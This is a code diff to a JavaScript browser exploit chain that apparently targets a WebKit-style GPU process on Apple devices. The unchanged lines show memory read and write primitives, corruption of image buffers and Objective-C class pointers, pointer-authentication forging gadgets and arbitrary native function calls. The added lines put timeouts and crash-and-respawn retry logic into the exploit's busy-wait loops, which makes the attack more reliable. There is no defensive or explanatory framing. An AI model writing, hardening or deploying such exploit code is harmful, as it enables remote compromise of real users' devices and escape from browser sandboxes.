@@ -6709,17 +6709,22 @@
         }
       }
     }
-    receiveMessage(messageName) {
+    receiveMessage(messageName, maxRetries = 20) {
+      let retries = 0;
       while (1) {
         const decoder = this.tryReceiveMessage();
         if (decoder.messageName == messageName) {
           return decoder;
         }
+        if (++retries > maxRetries) {
+          ASSERT_NOT_REACHED(`receiveMessage(${messageName.toString(16)}): exceeded ${maxRetries} retries`);
+        }
       }
     }
-    receiveMessages(messageNames) {
+    receiveMessages(messageNames, maxRetries = 50) {
       const result = new Array(messageNames.length);
       let count = 0;
+      let retries = 0;
       while (1) {
         const decoder = this.tryReceiveMessage();
         for (let i = 0; i < result.length; ++i) {
@@ -6732,12 +6737,19 @@
             }
           }
         }
+        if (++retries > maxRetries) {
+          ASSERT_NOT_REACHED(`receiveMessages: exceeded ${maxRetries} retries, got ${count}/${messageNames.length}`);
+        }
       }
     }
-    receiveSyncReply(syncRequestID) {
+    receiveSyncReply(syncRequestID, maxRetries = 20) {
+      let retries = 0;
       while (1) {
         const decoder = this.receiveMessage(MessageName.SyncMessageReply);
         if (decoder.decode('uint64_t') == syncRequestID) return decoder;
+        if (++retries > maxRetries) {
+          ASSERT_NOT_REACHED(`receiveSyncReply(${syncRequestID}): exceeded ${maxRetries} retries`);
+        }
       }
     }
     sendMessage(encoder, attachments = []) {
@@ -7537,7 +7549,14 @@
       const connection = read64(gpuProcessConnection + 0x20n);
       LOG(`waiting for sendPort`);
       read64_biguint64arr[1] = connection + 0x138n;
-      while (!read64_str.charCodeAt(0));
+      {
+        const port_wait_begin = performance.now();
+        while (!read64_str.charCodeAt(0)) {
+          if (performance.now() - port_wait_begin > 5000) {
+            ASSERT_NOT_REACHED('sendPort not received after GPU respawn (5s timeout)');
+          }
+        }
+      }
       LOG(`received sendPort`);
       const maybe_port = read32(connection + 0x138n);
       LOG(`maybe_port: ${maybe_port.hex()}`);
@@ -7812,9 +7831,17 @@
     LOG(`stack_bottom: ${stack_bottom.hex()}`);
     const stack_top = gpu_slow_read64(backend2_processingThread + 0x18n);
     LOG(`stack_top: ${stack_top.hex()}`);
-    while (true) {
-      const lr = gpu_slow_read64(stack_bottom - 0x18c8n) & 0xffff_ffffn;
-      if (lr == dlopen_from_lambda_ret) break;
+    {
+      const mutex_wait_begin = performance.now();
+      while (true) {
+        const lr = gpu_slow_read64(stack_bottom - 0x18c8n) & 0xffff_ffffn;
+        if (lr == dlopen_from_lambda_ret) break;
+        if (performance.now() - mutex_wait_begin > 10000) {
+          crashGPUProcess('mutex lock timeout (backend2)');
+          return respawn_gpu_process_and_retry();
+        }
+        sleep(10);
+      }
     }
     LOG('RemoteRenderingBackend2 has been mutex-locked');
     const loader = stack_bottom - 0x18c8n + 0x78n;
@@ -7858,13 +7885,20 @@
     gpu_slow_write64(offsets.libsystem_c__atexit_mutex + 0x20n, 0x101n);
     gpu_slow_write64(imageBuffer3 + 0x20n, offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice);
     RemoteRenderingBackend_ReleaseImageBuffer(backendConnection3, imageBufferIdentifier3);
-    while (true) {
-      const InterposeTupleAll_buffer = gpu_slow_read64(p_InterposeTupleAll_buffer);
-      if (InterposeTupleAll_buffer) {
-        LOG(`InterposeTupleAll_buffer: ${InterposeTupleAll_buffer.hex()}`);
-        break;
+    {
+      const interpose_wait_begin = performance.now();
+      while (true) {
+        const InterposeTupleAll_buffer = gpu_slow_read64(p_InterposeTupleAll_buffer);
+        if (InterposeTupleAll_buffer) {
+          LOG(`InterposeTupleAll_buffer: ${InterposeTupleAll_buffer.hex()}`);
+          break;
+        }
+        if (performance.now() - interpose_wait_begin > 15000) {
+          crashGPUProcess('interpose tuple write-back timeout (backend2)');
+          return respawn_gpu_process_and_retry();
+        }
+        sleep(10);
       }
-      sleep(10);
     }
     LOG(`RemoteRenderingBackend2 has been spin-locked`);
     gpu_slow_write64(offsets.libsystem_c__atexit_mutex + 0x20n, 0x102n);
@@ -7885,10 +7919,17 @@
     LOG(`backend3_stack_bottom: ${backend3_stack_bottom.hex()}`);
     const backend3_stack_top = gpu_slow_read64(backend3_processingThread + 0x18n);
     LOG(`backend3_stack_top: ${backend3_stack_top.hex()}`);
-    while (true) {
-      const lr = gpu_slow_read64(backend3_stack_bottom - 0x17a8n) & 0xffff_ffffn;
-      if (lr == dlopen_from_lambda_ret) break;
-      sleep(10);
+    {
+      const mutex_wait_begin = performance.now();
+      while (true) {
+        const lr = gpu_slow_read64(backend3_stack_bottom - 0x17a8n) & 0xffff_ffffn;
+        if (lr == dlopen_from_lambda_ret) break;
+        if (performance.now() - mutex_wait_begin > 10000) {
+          crashGPUProcess('mutex lock timeout (backend3)');
+          return respawn_gpu_process_and_retry();
+        }
+        sleep(10);
+      }
     }
     LOG('RenderingBackend3 has been mutex-locked');
     const backend3_loader = backend3_stack_bottom - 0x17a8n + 0x78n;
@@ -7904,10 +7945,17 @@
     gpu_slow_write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x18n, 0x5en);
     gpu_slow_write64(imageBuffer5 + 0x20n, offsets.AVFAudio__OBJC_CLASS__AVSpeechUtterance);
     RemoteRenderingBackend_ReleaseImageBuffer(backendConnection4, imageBufferIdentifier5);
-    while (true) {
-      const ptr = gpu_slow_read64(p_InterposeTupleAll_size);
-      if (ptr === 0x100n) break;
-      sleep(10);
+    {
+      const interpose_wait_begin = performance.now();
+      while (true) {
+        const ptr = gpu_slow_read64(p_InterposeTupleAll_size);
+        if (ptr === 0x100n) break;
+        if (performance.now() - interpose_wait_begin > 15000) {
+          crashGPUProcess('interpose size write-back timeout (backend3)');
+          return respawn_gpu_process_and_retry();
+        }
+        sleep(10);
+      }
     }
     LOG('RenderingBackend3 has been spin-locked');
     let fontIdentifier = 0x1234n;
@@ -7971,9 +8019,15 @@
       gpu_slow_write64(invoker_x0 + 0x38n, x2);
       gpu_slow_write64(slowFcallResult, 0n);
       invoke(invoker_arg);
-      while (true) {
-        const result = gpu_slow_read64(slowFcallResult);
-        if (result) return result;
+      {
+        const fcall_begin = performance.now();
+        while (true) {
+          const result = gpu_slow_read64(slowFcallResult);
+          if (result) return result;
+          if (performance.now() - fcall_begin > 5000) {
+            ASSERT_NOT_REACHED('gpu_slow_fcall_1 timed out waiting for result');
+          }
+        }
       }
     }
     function gpu_slow_fcall_2(pc, x0 = -1n, x1 = -1n, x2 = -1n, x3 = -1n) {
@@ -7988,9 +8042,15 @@
       gpu_slow_write64(invoker_x0 + 0x40n, x3);
       gpu_slow_write64(slowFcallResult, 71n);
       invoke(invoker_arg);
-      while (true) {
-        const result = gpu_slow_read64(slowFcallResult);
-        if (result != 0x71n) return result;
+      {
+        const fcall_begin = performance.now();
+        while (true) {
+          const result = gpu_slow_read64(slowFcallResult);
+          if (result != 0x71n) return result;
+          if (performance.now() - fcall_begin > 5000) {
+            ASSERT_NOT_REACHED('gpu_slow_fcall_2 timed out waiting for result');
+          }
+        }
       }
     }
     function gpu_slow_pacia(ptr, ctx) {
@@ -8134,10 +8194,16 @@
       gpu_slow_write64(x19 + 0x20n, MAGIC);
       gpu_slow_write64(x19, paciza_gadget_loop_1);
       gpu_slow_write64(x20 + 0x10n, paciza_gadget_control_3_4);
-      while (true) {
-        const result = gpu_slow_read64(x19 + 0x20n);
-        if (result !== MAGIC) {
-          return result;
+      {
+        const fcall_begin = performance.now();
+        while (true) {
+          const result = gpu_slow_read64(x19 + 0x20n);
+          if (result !== MAGIC) {
+            return result;
+          }
+          if (performance.now() - fcall_begin > 5000) {
+            ASSERT_NOT_REACHED('gpu_slow_fcall timed out waiting for result');
+          }
         }
       }
     }
@@ -8240,19 +8306,29 @@
       const sizeBufferDataPointer = sizeBuffer.data();
       let fakeStackDataPointer = 0n;
       let memory = 0n;
-      while (1) {
-        let next_ptr = 0n;
+      {
+        let alignment_attempts = 0;
         while (1) {
-          const ab = new ArrayBuffer(0x6000);
-          next_ptr = ab.data() + 0x6000n;
-          if (next_ptr == (next_ptr & ~0x3fffn)) {
-            break;
+          if (++alignment_attempts > 64) {
+            ASSERT_NOT_REACHED('fakeStack alignment search exceeded 64 attempts');
           }
+          let next_ptr = 0n;
+          let inner_attempts = 0;
+          while (1) {
+            if (++inner_attempts > 256) {
+              ASSERT_NOT_REACHED('fakeStack inner alignment search exceeded 256 attempts');
+            }
+            const ab = new ArrayBuffer(0x6000);
+            next_ptr = ab.data() + 0x6000n;
+            if (next_ptr == (next_ptr & ~0x3fffn)) {
+              break;
+            }
+          }
+          memory = new ArrayBuffer(0x88000);
+          fakeStackDataPointer = memory.data();
+          if (fakeStackDataPointer == (fakeStackDataPointer & ~0x3fffn)) break;
+          LOG(`fakeStack not aligned:${fakeStackDataPointer.hex()}, continue searching`);
         }
-        memory = new ArrayBuffer(0x88000);
-        fakeStackDataPointer = memory.data();
-        if (fakeStackDataPointer == (fakeStackDataPointer & ~0x3fffn)) break;
-        LOG(`fakeStack not aligned:${fakeStackDataPointer.hex()}, continue searching`);
       }
       ASSERT(fakeStackDataPointer == (fakeStackDataPointer & ~0x3fffn), "fakeStack is not page aligned");
       kr = fcall(offsets.mach_make_memory_entry_64_fn, __mach_task_self, sizeBufferDataPointer, fakeStackDataPointer, 3n, sizeBufferDataPointer + 8n, 0n);
